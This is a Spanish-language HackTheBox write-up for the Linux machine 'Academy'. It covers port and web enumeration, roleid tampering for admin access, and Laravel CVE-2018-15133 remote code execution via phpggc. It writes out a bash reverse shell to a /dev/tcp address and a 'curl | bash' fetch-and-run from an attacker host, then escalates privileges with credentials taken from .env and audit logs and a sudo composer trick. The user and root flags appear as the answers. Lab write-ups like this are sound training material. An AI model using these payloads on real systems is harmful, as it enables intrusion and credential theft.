---
title: HackTheBox - Academy
author: cotes
date: 2023-09-07 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, Laravel]
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Academy/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Academy Machine Logo
---

Máquina Linux de nivel **Easy** de HackThBox.

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos en la **`Máquina Academy`**

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/Machines/Academy/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p21,80,33060 -sCV <IP> -oN versiones`**

    ```
    <SNIP>
    http-title: Did not follow redirect to http://academy.htb/
    <SNIP>
    ```

    * Tenemos un dominio, el cual debemos guardar en el archivo **`/etc/hosts`**  para indicar que la **IP de la Máquina** resuelva a **`http://academy.htb/`**

        ```
        <IP>    academy.htb
        ```

c. Si vistamos el servicio web, vemos que nos podemos **`Registrar`** o **`Loguear`**, por lo que enumeraremos por más archivos **`.php`** que puedan existir

```pl
wfuzz -c -t 10 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://academy.htb/FUZZ.php
```

```
000000256:   200        141 L    227 W      2633 Ch     "admin"
```

d. Si capturamos la petición de **`registrar`** con **`Burp Suite`** veremos que se envía un **`roleid`** con valor de `0` por default

* **`uid=test&password=test&confirm=test&roleid=0`**

    * Lo que haremos es cambiarlo **`1,2,3,etc`** para ver si la cuenta registrada cambia de privilegios o es válida en **`/admin.php`** 

    * El **`roleid`** válido es `1`

e. Nos autenticamos en **`/admin.php`** y veremos un subdominio, también lo agregamos al **`/etc/hosts`**

![](/assets/images/Machines/Academy/02-subdomain.png)


f. Si visitamos el nuevo subdominio, veremos un error de Laravel, del cual podemos extraer la **`APP_KEY`** (Variable de configuración utilizada para mantener segura la información sensible, como las sesiones, las cookies y otras características de seguridad)

1. [CVE-2018-15133](https://github.com/kozmic/laravel-poc-CVE-2018-15133) y [phpgcc](https://github.com/ambionics/phpggc)

2. El escnario será el siguiente: 
    * Crearemos con **`phpgcc`** una comando encodeado que realice una petición una archivo que estará hosteado en una **`Máquina Atacante`** (**`index.html`**)

        ```html
        #!/bin/bash
        bash -i >& /dev/tcp/<tun0 IP>/443 0>&1
        ```

        * **`python3 -m http.server 8000`**

    * Nos ponemo en escucha con **`nc -lvnp 443`**

    * El comando encodeado será **`curl -s -X GET http://<tun0 ip>:8000/index.html | bash`**, lo que haremos es cargar el contenido del archivo **`index.html` de nuestra Máquina** y lo interpretaremos con **`bash`**

        ```bash
        ./phpggc Laravel/RCE1 system 'curl -s -X GET http://10.10.14.115:8000/index.html | bash' -b
        ```

    * Ejecutamos el exploit

        ```bash
        ./cve-2018-15133.php <APP_KEY> <OUTPUT phpgcc>
        ```

     * El **output** del exploit lo tramitamos como cabecera en un petición por **post** a **`http://dev-staging-01.academy.htb/`**

        ```bash
        curl -s -X POST http://dev-staging-01.academy.htb/ -H "X-XSRF-TOKEN: eyJpdiI6ImFWSWpQRDZKXC8xaVpyYzZW<SNIP>="
        ```

        ```bash
        nc -lvnp 443
        www-data@academy:/var/www/html/htb-academy-dev-01/public$
        ```

### Escalada de Privilegios 💹

a. Listamos los archivos **`.env`** (Aquí se almacenan credenciales de bases de datos u otra aplicación) de los proyectos **`academy htb-academy-dev-01`**

```bash
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!
```
    
b. Vemos que existen varios usuarios **`21y4d, ch4p, cry0l1t3, egre55, g0blin, mrb3n`**, el usuario con la contraseña **`mySup3rP4s5w0rd!!`** es **`cry0l1t3`**

```bash
su cry0l1t3
Password: mySup3rP4s5w0rd!!
script /dev/null -c bash
Script started, file is /dev/null
cry0l1t3@academy:/var/www/html$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

* Grupo **`adm`:** Podemos ver archivos de **`logs`**

c. Vemos que podemos listar el contenido de **`/var/log/audit`** (Aquí se almacenan logs de inicio de sesión de usuarios, cambios de permisos, etc)

* En este directorio filtraremos por líneas que contengan los nombres de los usuarios del sistema

    ```bash
    cry0l1t3@academy:/var/log/audit$ grep -r -i "mrb3n" *
    ```

d. Analizaremos en busca de lo siguiente en todos los archivos **`audit.log`**

* **`type=TTY`**: Relacionado con una terminal de tipo "TTY".


* **`tty pid=<N> uid=<N> auid=<N> ses=<N>`**: Estos campos registran información sobre el proceso (pid), el ID de usuario (uid), el ID de usuario auditado (auid) y la sesión (ses) asociada con el evento. 

* **`comm="[Comando]"`**: Este campo muestra el nombre del comando o programa que se estaba ejecutando cuando se registró el evento.

* **`data=[Data Hexadecimal]`**: Esta es la parte más interesante del registro y es específica del evento en sí.

    📇 En ocasiones tenemos que ejecutar dos veces seguidas este comando.

    ```
    grep -r "mrb3n" -C 10 | grep -i "tty" | grep "data" | awk '{print $11}' | tr -d "data=" | xxd -ps -r
    ```

    ```
    <SNIP>
    mrb3n_Ac@d3my!
    <SNIP>
    ```

e. Pasamos al usuario **`mrb3n`** con la credenciale reciente y listamos por privilegios que tengamos en el archivo **`sudoers`**

```bash
mrb3n@academy:/var/log/audit$ sudo -l
[sudo] password for mrb3n: mrb3n_Ac@d3my!

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

f. Vamos a [GTFObins](https://gtfobins.github.io/) y buscamos una forma de escalar privilegios con este permiso asignado.

* Por último, ya como **`root`** leemos las **`flags`**

    ```bash
    root@academy:/tmp/tmp.dA8tTSy4Sk# find / -name user.txt 2>/dev/null  | xargs cat
    b4fb4ebd4e45397059048b75d2572658

    root@academy:/tmp/tmp.dA8tTSy4Sk# find / -name root.txt 2>/dev/null  | xargs cat
    b031b75fe05537f90812f247d5de1177
    ```